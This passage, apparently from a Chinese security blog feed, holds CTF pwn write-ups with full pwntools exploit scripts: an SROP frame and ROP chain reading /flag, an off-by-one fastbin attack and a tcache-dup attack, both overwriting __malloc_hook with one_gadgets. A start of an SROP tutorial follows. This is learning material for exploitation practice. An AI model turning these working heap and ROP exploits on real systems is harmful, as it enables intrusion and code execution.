class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span 